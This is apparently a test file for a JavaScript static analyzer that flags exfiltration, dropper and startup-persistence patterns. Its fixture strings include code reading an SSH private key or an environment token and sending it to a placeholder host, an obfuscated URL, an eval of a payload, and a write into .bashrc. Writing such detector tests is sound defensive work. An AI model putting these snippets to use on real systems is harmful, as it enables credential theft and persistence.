import { test, expect } from "bun:test";
import { analyze } from "./analyze";

const risks = (code: string) => new Set(analyze(code).risks ?? []);

test("exfiltration = secret-FILE read + network", () => {
  const code = `const fs = require('fs');\nconst k = fs.readFileSync('/home/u/.ssh/id_rsa');\nfetch('http://x/?k=' + k);`;
  expect(risks(code).has("EXFILTRATION")).toBe(true);
});

test("benign API client (process.env + fetch) does NOT fire EXFILTRATION", () => {
  const code = `const key = process.env.API_KEY;\nfetch('https://api.co', { headers: { key } });`;
  expect(risks(code).has("EXFILTRATION")).toBe(false);
});

test("obfuscated env-read + network DOES fire EXFILTRATION", () => {
  const code = `const k = process.env.TOKEN;\nconst u = atob('aHR0cDov');\nfetch(u + k);`;
  expect(risks(code).has("EXFILTRATION")).toBe(true);
});

test("benign CLI (child_process + https) does NOT fire DROPPER", () => {
  const code = `const cp = require('child_process');\nconst https = require('https');`;
  expect(risks(code).has("DROPPER")).toBe(false);
});

test("exec + network + opacity DOES fire DROPPER", () => {
  const code = `const cp = require('child_process');\nconst https = require('https');\neval(payload);`;
  expect(risks(code).has("DROPPER")).toBe(true);
});

test("startup persistence = filesystem + startup-file target", () => {
  const code = `const fs = require('fs');\nfs.writeFileSync(home + '/.bashrc', payload);`;
  expect(risks(code).has("STARTUP_PERSISTENCE")).toBe(true);
});

test("a single capability raises no risk", () => {
  expect(analyze(`const https = require('https');`).risks ?? []).toEqual([]);
});

test("contract: plain exec+network reports capabilities but no risk escalation", () => {
  const r = analyze(`const cp = require('child_process');\nconst https = require('https');`);
  expect(new Set(r.capabilities)).toEqual(new Set(["EXEC", "NETWORK"]));
  expect(r.risks ?? []).toEqual([]);
});
